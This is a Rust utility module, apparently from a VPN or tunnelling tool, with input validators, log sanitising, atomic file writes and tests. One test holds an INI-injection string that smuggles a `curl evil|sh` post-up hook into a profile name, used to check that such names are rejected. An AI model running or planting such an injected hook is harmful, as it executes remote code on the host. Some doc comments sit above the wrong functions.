//! Small cross-platform utilities shared across the crate.

use std::path::Path;

/// Validate a route CIDR (`10.20.0.0/16`). The address must parse as an `IpAddr`
/// and the prefix must be a decimal length in range for the family. Also rejects
/// anything that could be read as an `ip` option (leading `-`).
///
/// Shared by the config parser, the panel API and the client's route applier so a
/// route is rejected where it is *authored* (with an error the admin can see),
/// not silently dropped on the wire.
pub fn is_valid_cidr(s: &str) -> bool {
    if s.starts_with('-') {
        return false;
    }
    let Some((addr, prefix)) = s.split_once('/') else {
        return false;
    };
    let Ok(ip) = addr.parse::<std::net::IpAddr>() else {
        return false;
    };
    let Ok(len) = prefix.parse::<u8>() else {
        return false;
    };
    let max = if ip.is_ipv4() { 32 } else { 128 };
    len <= max
}

/// Validate a route gateway: a bare `IpAddr` (NOT a CIDR/subnet), and not
/// something that could be read as an `ip` option (leading `-`).
pub fn is_valid_gateway(s: &str) -> bool {
    !s.starts_with('-') && s.parse::<std::net::IpAddr>().is_ok()
}

/// Validate a name used as INI *structure*: a section instance
/// (`[profile:<name>]`, `[user:<name>]`, `[group:<name>]`) or the dynamic tail of
/// a key (`metadata.<key>`).
///
/// SECURITY: unlike values, section headers and keys are serialized bare, and the
/// INI grammar is line-oriented with no continuations. A control character in a
/// name therefore splits the line and forges extra `[section]` / `key = value`
/// lines when the file is read back — the route by which a panel-supplied profile
/// name could smuggle a `routing.post_up` hook (run through `/bin/sh -c` on the
/// next start) past the API guard that deliberately keeps hooks file-only.
/// Leading/trailing whitespace is rejected too: the parser trims, so such a name
/// would silently return renamed.
///
/// This deliberately rejects only what is structurally unsafe rather than
/// allowlisting a charset — names like `user@example.com` stay valid, so existing
/// deployments keep saving. `config/format.rs` strips control characters at
/// serialize time as a fail-closed backstop; this check exists so the operator
/// gets a clear error instead of a silently mangled name.
pub fn is_valid_ident(s: &str) -> bool {
    !s.is_empty() && s.len() <= 128 && !s.chars().any(|c| c.is_control()) && s.trim() == s
}

#[cfg(test)]
mod route_validate_tests {
    use super::{is_valid_cidr, is_valid_gateway};

    #[test]
    fn cidr_accepts_real_networks() {
        assert!(is_valid_cidr("172.16.20.0/24"));
        assert!(is_valid_cidr("10.0.0.0/8"));
        assert!(is_valid_cidr("::/0"));
    }

    #[test]
    fn cidr_rejects_empty_bare_and_option_like() {
        assert!(!is_valid_cidr("")); // the empty-cidr bug: `route = " gateway=… "`
        assert!(!is_valid_cidr("172.16.20.0")); // no prefix
        assert!(!is_valid_cidr("172.16.20.0/33")); // prefix out of range
        assert!(!is_valid_cidr("nonsense/24"));
        assert!(!is_valid_cidr("-hostile/24"));
    }

    #[test]
    fn gateway_is_a_bare_ip_not_a_subnet() {
        assert!(is_valid_gateway("10.0.0.1"));
        // the exact mistake that produced an empty cidr: a subnet in `gateway=`
        assert!(!is_valid_gateway("172.16.20.0/24"));
        assert!(!is_valid_gateway(""));
    }

    #[test]
    fn ident_accepts_realistic_names() {
        // Must not regress existing deployments: plain names, dots/underscores/
        // hyphens and email-style usernames all stay valid.
        for ok in [
            "tcp",
            "udp-quic",
            "profile.one",
            "user_2",
            "user@example.com",
            "Группа",
        ] {
            assert!(super::is_valid_ident(ok), "{ok:?} must be a valid name");
        }
    }

    #[test]
    fn ident_rejects_ini_injection_and_silent_renames() {
        // SECURITY: the newline is the actual injection vector — it forges a
        // `routing.post_up` line (command execution) out of a profile NAME.
        assert!(!super::is_valid_ident(
            "tcp]\nrouting.post_up = curl evil|sh\n[profile:junk"
        ));
        assert!(!super::is_valid_ident("a\rb"));
        assert!(!super::is_valid_ident("a\u{0}b"));
        // The parser trims, so edge whitespace would come back silently renamed.
        assert!(!super::is_valid_ident(" tcp"));
        assert!(!super::is_valid_ident("tcp "));
        assert!(!super::is_valid_ident(""));
        assert!(!super::is_valid_ident(&"x".repeat(129)));
    }
}

/// Escape control characters (notably CR/LF) in an untrusted string before it is
/// written to a log line. An attacker-supplied value — a login `username`, a
/// control-command `profile` — could otherwise embed `\n` and forge additional
/// fake log records (log injection, CWE-117 / H-8). Printable text is unchanged.
pub fn log_sanitize(s: &str) -> String {
    if !s.chars().any(|c| c.is_control()) {
        return s.to_string();
    }
    let mut out = String::with_capacity(s.len() + 8);
    for c in s.chars() {
        match c {
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if c.is_control() => out.push_str(&format!("\\x{:02x}", c as u32)),
            c => out.push(c),
        }
    }
    out
}

/// Write `bytes` to `path` **atomically**: a uniquely-named temp file in the same
/// directory is written, `fsync`'d, then `rename`d over the target. A crash, power
/// loss, or full disk mid-write therefore leaves either the previous file fully
/// intact or the new one fully written — never a truncated/half-written file. This
/// matters for the files that are rewritten while the server is live (the users DB
/// holding every password hash, the config, identity keys): a bare
/// `std::fs::write` truncates first and can corrupt them.
///
/// On Unix the temp is opened with `O_EXCL` (`create_new`) + `O_NOFOLLOW` and an
/// unpredictable name, so a local attacker cannot pre-plant a symlink at the temp
/// path to redirect the write — the server runs as root writing into `/etc`
/// (H-5). On non-Unix targets (the realtls FFI cdylib builds for Windows/macOS,
/// which compile `crypto`/`config` too) the same temp+rename is used without the
/// Unix-only open flags. Replacing a symlink target with the renamed regular file
/// is intentional and matches the previous `dns.rs` behaviour.
///
/// Render the log timestamp in the shape selected by `[logging] time_format`.
/// Shared by the server (`main.rs`) and the router/headless client
/// (`client_main.rs`) so both honour the same setting.
///
/// | value | example | when |
/// |---|---|---|
/// | `datetime` | `2026-07-18 18:10:03.259` | local time (default) — reading by eye |
/// | `rfc3339`  | `2026-07-18T18:10:03.259Z` | UTC — correlating hosts, shipping to Loki/ELK |
/// | `time`     | `18:10:03.259` | local, no date — routers, mobile, narrow viewers |
/// | `epoch`    | `1782000603.259` | unix seconds.millis (UTC) — machine post-processing |
/// | `none`     | *(empty)* | the platform already stamps: journald / logread / logcat |
///
/// An unknown value degrades to `datetime` rather than losing the timestamp.
/// `iso8601` is accepted as an alias of `rfc3339`, `off`/`unix` of `none`/`epoch`.
pub fn log_timestamp(fmt: &str) -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let f = fmt.trim().to_ascii_lowercase();
    if f == "none" || f == "off" {
        return String::new();
    }
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default();
    let secs = now.as_secs() as i64;
    let ms = now.subsec_millis();
    if f == "epoch" || f == "unix" {
        return format!("{secs}.{ms:03}");
    }
    let utc = f == "rfc3339" || f == "iso8601";
    let (y, mo, d, h, mi, s) = broken_down_time(secs, utc);
    match f.as_str() {
        "rfc3339" | "iso8601" => format!("{y:04}-{mo:02}-{d:02}T{h:02}:{mi:02}:{s:02}.{ms:03}Z"),
        "time" => format!("{h:02}:{mi:02}:{s:02}.{ms:03}"),
        // `datetime` and anything unrecognised.
        _ => format!("{y:04}-{mo:02}-{d:02} {h:02}:{mi:02}:{s:02}.{ms:03}"),
    }
}

/// `(year, month, day, hour, min, sec)` for a unix timestamp — local unless `utc`.
/// Unix uses libc's tz-aware conversion; other targets (the FFI cdylib builds for
/// Windows) have no tz database here, so they always render UTC.
fn broken_down_time(secs: i64, utc: bool) -> (i64, u32, u32, u32, u32, u32) {
    #[cfg(unix)]
    {
        let t = secs as libc::time_t;
        let mut tm: libc::tm = unsafe { std::mem::zeroed() };
        unsafe {
            if utc {
                libc::gmtime_r(&t, &mut tm);
            } else {
                libc::localtime_r(&t, &mut tm);
            }
        }
        (
            tm.tm_year as i64 + 1900,
            tm.tm_mon as u32 + 1,
            tm.tm_mday as u32,
            tm.tm_hour as u32,
            tm.tm_min as u32,
            tm.tm_sec as u32,
        )
    }
    #[cfg(not(unix))]
    {
        let _ = utc; // no tz database on this path — always UTC
        let days = secs.div_euclid(86_400);
        let rem = secs.rem_euclid(86_400);
        // Howard Hinnant's civil_from_days (proleptic Gregorian).
        let z = days + 719_468;
        let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
        let doe = (z - era * 146_097) as i64;
        let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
        let y = yoe + era * 400;
        let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
        let mp = (5 * doy + 2) / 153;
        let d = (doy - (153 * mp + 2) / 5 + 1) as u32;
        let m = if mp < 10 { mp + 3 } else { mp - 9 } as u32;
        (
            if m <= 2 { y + 1 } else { y },
            m,
            d,
            (rem / 3600) as u32,
            ((rem % 3600) / 60) as u32,
            (rem % 60) as u32,
        )
    }
}

/// PERMISSIONS: a temp+rename creates a NEW inode, which would otherwise drop the
/// target's mode to the umask default — a regression for files that must stay
/// `0600` (the users DB holds every password hash). So when the target already
/// exists its Unix mode is copied onto the temp before the rename, matching
/// `std::fs::write`'s behaviour of leaving an existing file's permissions intact.
/// Exclusive advisory lock on `<path>.lock`, released when dropped.
///
/// Guards cross-process read-modify-write on a file that `write_atomic` replaces by
/// rename: the lock lives on a sidecar, because a lock taken on the target itself would
/// be attached to an inode the rename discards.
pub struct FileLock(#[allow(dead_code)] std::fs::File);

impl FileLock {
    #[cfg(unix)]
    pub fn acquire(path: impl AsRef<Path>) -> anyhow::Result<Self> {
        use std::os::unix::fs::OpenOptionsExt;
        use std::os::unix::io::AsRawFd;
        let lock_path = format!("{}.lock", path.as_ref().display());
        let f = std::fs::OpenOptions::new()
            .create(true)
            .truncate(false)
            .write(true)
            .mode(0o600)
            .open(&lock_path)
            .map_err(|e| anyhow::anyhow!("cannot open the lock {}: {}", lock_path, e))?;
        if unsafe { libc::flock(f.as_raw_fd(), libc::LOCK_EX) } != 0 {
            return Err(anyhow::anyhow!(
                "cannot lock {}: {}",
                lock_path,
                std::io::Error::last_os_error()
            ));
        }
        // Hand the lock to whoever owns the file it guards. The CLI (`qeli add-client`)
        // is normally run with sudo while the daemon runs as an unprivileged account, so
        // a root-created 0600 sidecar would be unopenable by the service — and every
        // later users-file change from the panel or the control socket would fail with
        // EACCES. Best effort: only root can chown, and a mismatch is not fatal on a
        // single-user setup.
        if let Ok(target) = std::fs::metadata(path.as_ref()) {
            use std::os::unix::fs::MetadataExt;
            if let Ok(lock_meta) = f.metadata() {
                if lock_meta.uid() != target.uid() || lock_meta.gid() != target.gid() {
                    let c_path = std::ffi::CString::new(lock_path.as_str()).ok();
                    if let Some(c) = c_path {
                        unsafe { libc::chown(c.as_ptr(), target.uid(), target.gid()) };
                    }
                }
            }
        }
        Ok(FileLock(f))
    }

    #[cfg(not(unix))]
    pub fn acquire(_path: impl AsRef<Path>) -> anyhow::Result<Self> {
        Err(anyhow::anyhow!("file locking is Unix-only"))
    }
}

pub fn write_atomic(path: impl AsRef<Path>, bytes: &[u8]) -> anyhow::Result<()> {
    write_atomic_inner(path, bytes, false)
}

/// Like [`write_atomic`], but the result is always `0600` — for files that must never be
/// world-readable regardless of whether they already existed: the users file (password
/// hashes), identity and panel keys, the notification token, the server config (it holds
/// the panel's password hash).
///
/// Plain `write_atomic` preserves an EXISTING target's mode, which is right for
/// `/etc/resolv.conf` and friends but silently created a fresh secret at the umask
/// default — and, worse, wrote the secret's bytes into a temp file that was already
/// world-readable before any mode was applied. Both are closed below.
pub fn write_atomic_private(path: impl AsRef<Path>, bytes: &[u8]) -> anyhow::Result<()> {
    write_atomic_inner(path, bytes, true)
}

fn write_atomic_inner(path: impl AsRef<Path>, bytes: &[u8], private: bool) -> anyhow::Result<()> {
    use std::io::Write;
    let path = path.as_ref();
    let dir = path
        .parent()
        .filter(|p| !p.as_os_str().is_empty())
        .unwrap_or_else(|| Path::new("."));
    let stem = path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("qeli-file");

    // Retry on the (rare) random-name clash.
    let mut last_err: Option<std::io::Error> = None;
    for _ in 0..8 {
        let mut rnd = [0u8; 8];
        rand::Rng::fill_bytes(&mut rand::rng(), &mut rnd);
        let suffix: String = rnd.iter().map(|b| format!("{b:02x}")).collect();
        let tmp = dir.join(format!(".{stem}.qeli-tmp-{suffix}"));

        let mut opts = std::fs::OpenOptions::new();
        opts.write(true).create_new(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            opts.custom_flags(libc::O_NOFOLLOW);
            // Born private, before a single byte is written. The mode was previously left
            // to the umask and only adjusted afterwards, so the secret existed on disk
            // world-readable for the length of the write.
            opts.mode(0o600);
        }
        match opts.open(&tmp) {
            Ok(mut f) => {
                // Settle the final mode. A private file stays 0600; otherwise inherit the
                // target's existing mode (so `/etc/resolv.conf` keeps being readable), and
                // fall back to 0644 when there is no target yet.
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    if !private {
                        let mode = std::fs::metadata(path)
                            .map(|m| m.permissions().mode() & 0o777)
                            .unwrap_or(0o644);
                        let _ = f.set_permissions(std::fs::Permissions::from_mode(mode));
                    }
                }
                f.write_all(bytes)
                    .and_then(|()| f.sync_all())
                    .map_err(|e| anyhow::anyhow!("write {}: {}", tmp.display(), e))?;
                drop(f);
                return std::fs::rename(&tmp, path).map_err(|e| {
                    let _ = std::fs::remove_file(&tmp);
                    anyhow::anyhow!("rename {} -> {}: {}", tmp.display(), path.display(), e)
                });
            }
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {
                last_err = Some(e);
                continue;
            }
            Err(e) => {
                return Err(anyhow::anyhow!("create temp in {}: {}", dir.display(), e));
            }
        }
    }
    Err(anyhow::anyhow!(
        "could not create a fresh temp file in {}: {:?}",
        dir.display(),
        last_err
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Shape, not value — the clock moves while the test runs, so we assert the
    /// layout each variant promises in CONFIG.md rather than an exact string.
    #[test]
    fn log_timestamp_shapes_per_variant() {
        let dt = log_timestamp("datetime");
        assert_eq!(dt.len(), 23, "`YYYY-MM-DD HH:MM:SS.mmm`, got {dt:?}");
        assert_eq!(dt.as_bytes()[10], b' ');
        assert_eq!(dt.as_bytes()[19], b'.');

        let rfc = log_timestamp("rfc3339");
        assert_eq!(rfc.len(), 24, "`…THH:MM:SS.mmmZ`, got {rfc:?}");
        assert_eq!(rfc.as_bytes()[10], b'T');
        assert!(rfc.ends_with('Z'));
        // iso8601 is a documented alias, not a second implementation.
        assert_eq!(log_timestamp("iso8601").len(), rfc.len());

        let t = log_timestamp("time");
        assert_eq!(t.len(), 12, "`HH:MM:SS.mmm`, got {t:?}");

        for unix in ["epoch", "unix"] {
            let e = log_timestamp(unix);
            let (secs, ms) = e.split_once('.').expect("secs.millis");
            assert!(secs.parse::<u64>().unwrap() > 1_700_000_000, "{e:?}");
            assert_eq!(ms.len(), 3, "millis are zero-padded to 3: {e:?}");
        }
    }

    /// `none` suppresses the prefix entirely — that is what lets systemd/procd
    /// own the timestamp — and anything unrecognised must degrade to the
    /// default instead of killing startup over a config typo.
    #[test]
    fn log_timestamp_none_is_empty_and_junk_falls_back() {
        assert_eq!(log_timestamp("none"), "");
        assert_eq!(log_timestamp("off"), "");
        assert_eq!(log_timestamp("  NONE  "), "", "trimmed and case-folded");
        assert_eq!(log_timestamp("RFC3339").len(), 24, "case-insensitive");

        for junk in ["", "nope", "iso-9001", "datetime "] {
            assert_eq!(
                log_timestamp(junk).len(),
                23,
                "{junk:?} must fall back to datetime"
            );
        }
    }

    fn workspace(tag: &str) -> std::path::PathBuf {
        let p = std::env::temp_dir().join(format!(
            "qeli-util-{}-{}-{}",
            tag,
            std::process::id(),
            rand::random::<u32>()
        ));
        std::fs::create_dir_all(&p).unwrap();
        p
    }

    #[test]
    fn writes_and_replaces() {
        let dir = workspace("write");
        let target = dir.join("data.txt");
        write_atomic(&target, b"first").unwrap();
        assert_eq!(std::fs::read(&target).unwrap(), b"first");
        // Overwrite is atomic and leaves no temp files behind.
        write_atomic(&target, b"second-longer").unwrap();
        assert_eq!(std::fs::read(&target).unwrap(), b"second-longer");
        let leftover: Vec<_> = std::fs::read_dir(&dir)
            .unwrap()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_name().to_string_lossy().contains("qeli-tmp"))
            .collect();
        assert!(leftover.is_empty(), "temp files must be renamed away");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn preserves_existing_mode() {
        use std::os::unix::fs::PermissionsExt;
        let dir = workspace("perms");
        let target = dir.join("secrets");
        write_atomic(&target, b"hash1").unwrap();
        std::fs::set_permissions(&target, std::fs::Permissions::from_mode(0o600)).unwrap();
        // A rewrite must NOT widen the mode back to the umask default.
        write_atomic(&target, b"hash2").unwrap();
        let mode = std::fs::metadata(&target).unwrap().permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o600,
            "0600 secrets file must stay 0600 across rewrite"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    #[cfg(unix)]
    fn a_private_write_is_never_world_readable() {
        use std::os::unix::fs::PermissionsExt;
        let dir = std::env::temp_dir().join(format!("qeli-perm-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();

        // New file: the umask used to decide, so a fresh secrets file was born 0644.
        let secret = dir.join("secret.conf");
        let _ = std::fs::remove_file(&secret);
        write_atomic_private(&secret, b"hash").unwrap();
        let mode = std::fs::metadata(&secret).unwrap().permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o600,
            "a secret must not be group/world readable, got {mode:o}"
        );

        // Rewriting an over-permissive existing secret must NARROW it, not preserve it.
        std::fs::set_permissions(&secret, std::fs::Permissions::from_mode(0o644)).unwrap();
        write_atomic_private(&secret, b"hash2").unwrap();
        let mode = std::fs::metadata(&secret).unwrap().permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o600,
            "a private write must re-narrow the mode, got {mode:o}"
        );

        // The ordinary path still keeps a world-readable file readable (resolv.conf).
        let public = dir.join("resolv.conf");
        let _ = std::fs::remove_file(&public);
        write_atomic(
            &public,
            b"nameserver 1.1.1.1
",
        )
        .unwrap();
        std::fs::set_permissions(&public, std::fs::Permissions::from_mode(0o644)).unwrap();
        write_atomic(
            &public,
            b"nameserver 8.8.8.8
",
        )
        .unwrap();
        let mode = std::fs::metadata(&public).unwrap().permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o644,
            "a public file must stay readable, got {mode:o}"
        );

        let _ = std::fs::remove_dir_all(&dir);
    }
}
